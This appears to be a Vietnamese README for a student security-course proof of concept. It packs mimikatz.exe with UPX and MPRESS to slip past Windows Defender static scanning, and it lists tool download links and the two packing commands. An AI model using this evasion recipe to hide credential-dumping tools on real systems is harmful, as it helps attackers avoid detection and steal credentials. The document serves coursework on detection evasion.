# NT230_G19_S08_Binary-Packing_POC
Sử dụng công cụ UPX và MPRESS để nén file thực thi mimikatz.exe vượt qua quét tĩnh của Windows Defender

# Tải về các công cụ: 
1. UPX (phiên bản v5.0.1): https://github.com/upx/upx/releases/tag/v5.0.1
2. MPRESS: https://www.autohotkey.com/mpress/mpress_web.htm
3. Mimikatz (phiên bản gốc): https://github.com/ParrotSec/mimikatz

# Thực hiện packing Mimikatz.exe:
1. mpress -s -b mimikatz.exe: Lệnh này dùng MPRESS để nén tối đa file mimikatz.exe và tạo thêm bản backup gốc.
2. upx -9 --ultra-brute --compress-icons=0 mimikatz.exe -o MMK_upx.exe: Lệnh này dùng UPX ở mức nén cao nhất (–ultra-brute), không nén icon (giữ nguyên biểu tượng), và xuất ra file MMK_upx.ex

![image](https://github.com/user-attachments/assets/44faa6ee-281c-4fab-bf1d-398ffdb09b5b)
